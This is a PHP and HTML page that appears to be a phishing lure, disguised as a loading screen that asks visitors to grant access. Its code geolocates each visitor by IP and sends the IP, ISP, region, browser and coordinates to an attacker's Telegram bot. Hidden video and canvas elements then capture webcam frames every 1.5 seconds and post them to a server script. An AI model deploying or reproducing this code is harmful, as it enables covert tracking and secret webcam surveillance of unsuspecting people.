

<?php
include('config.php');
$ip = $_SERVER['REMOTE_ADDR'];
$Get_Ip = json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$lat = $Get_Ip->lat;
$lon = $Get_Ip->lon;
$isp = $Get_Ip->isp;
$regionName = $Get_Ip->regionName;
$region = $Get_Ip->region;
$browser = $_SERVER['HTTP_USER_AGENT'];
$txt = "
%%% New Target Location %%%
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
^^^   IP : $ip   ^^^
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
^^^   ISP : $isp   ^^^
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
^^^   REGION NAME : $regionName   ^^^ 
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
^^^   REGION : $region   ^^^
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
^^^   Confige System Target   ^^^

~~~   $browser   ~~~
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
";
file_get_contents("https://api.telegram.org/bot".$token."/sendmessage?chat_id=".$admin."&text=".urlencode($txt));
file_get_contents("https://api.telegram.org/bot".$token."/sendLocation?chat_id=".$admin."&latitude=".$lat."&longitude=".$lon);

?>









<!doctype html>
<html>
<head>
<html lang="fa">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>
<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
<script>
function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

    <body>
        <div id="pb">   
    <div id="progress"><!-- link sayte forwarde -->
     <a href="https://github.com/monster-hp"> <div id="done">!!! GO !!!</div></a><a>
    </a></div><a>
    Loading...
  </a></div><a>
  
  <style>
  
  {
    margin:0px;
    padding:0px;
    border:0px;
    font-family: sans-serif;
    cursor:default;
    -webkit-user-select: none;
  -ms-user-select: none;
  -o-user-select: none;
  user-select: none;   
  }
  body {
    background:linear-gradient(to left, #99e35b , #35e5dd);
  }
  #pb {
    -webkit-box-shadow: 0px 10px 40px rgba(0, 0, 0, 0.5), inset 1px 1px 20px rgba(0, 0, 0, 0.5);        
        box-shadow: 0px 10px 40px rgba(0, 0, 0, 0.5), inset 1px 1px 20px rgba(0, 0, 0, 0.5);
    background: #ccc;
        width:250px;
        height:38px;
        position:absolute;
        top:50%;
        left:50%;
        margin-top:-19px;
        margin-left:-125px;
        border-radius:8px;
        border-top:2px solid #DDD;
        border-left:2px solid #DDD;
        border-bottom:2px solid #BBB;
        border-right:2px solid #BBB;
        padding:3px;
        overflow:hidden;
        text-align:center;
        line-height:38px;
        font-size:14px;
        font-weight:bold;
        color:#666;
  }
  #progress {
    -webkit-transition: all 0.3s ease;
    -moz-transition: all 0.3s ease;
    -ms-transition: all 0.3s ease;
    -o-transition: all 0.3s ease;
    transition: all 0.3s ease;
    height:38px;
    width:48px;
    background-color:  #99e35b;
    border-radius:6px;
    background:  #99e35b;
    background: -moz-linear-gradient(top,   #99e35b 0%,  #99e35b 50%, #3690f0 51%, #1e69de 100%); /* FF3.6+ */
    background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#6db3f2), color-stop(50%,#54a3ee), color-stop(51%,#3690f0), color-stop(100%,#1e69de)); /* Chrome,Safari4+ */
    background: -webkit-linear-gradient(top,  #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%); /* Chrome10+,Safari5.1+ */
    background: -o-linear-gradient(top,  #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%); /* Opera 11.10+ */
    background: -ms-linear-gradient(top,  #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%); /* IE10+ */
    background: linear-gradient(to bottom,  #6db3f2 0%,#54a3ee 50%,#3690f0 51%,#1e69de 100%); /* W3C */
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#6db3f2', endColorstr='#1e69de',GradientType=0 ); /* IE6-8 */
    -webkit-box-shadow: inset 0px 0px 5px  rgba(0, 0, 0, 0.2), 2px 2px 5px  rgba(0, 0, 0, 0.2);        
        box-shadow: inset 0px 0px 5px  rgba(0, 0, 0, 0.2), 2px 2px 5px  rgba(0, 0, 0, 0.2);
        position:absolute;
        overflow:hidden;      
  }
  #done:active {
    -webkit-box-shadow: inset 0px 0px 18px  rgba(0, 0, 0, 0.4);        
        box-shadow: inset 0px 0px 18px  rgba(0, 0, 0, 0.4);
        border-radius:6px;
  }
  #done {
    text-align:center;
        line-height:38px;
        font-size:14px;
        font-weight:bold;
        color:#EEE;
        height:38px;
    width:250px;
    text-shadow: 0px -1px 0px rgba(0,0,0,0.2);    
        cursor:pointer;  
  }
  #pb:hover #progress{
    -webkit-transition: all 0.3s ease;
    -moz-transition: all 0.3s ease;
    -ms-transition: all 0.3s ease;
    -o-transition: all 0.3s ease;
    transition: all 0.3s ease;
    width:250px;
  }



Resources
  
  </style>
  <h2>To use the site, give the site access to use</h2>
	</body>
</html>
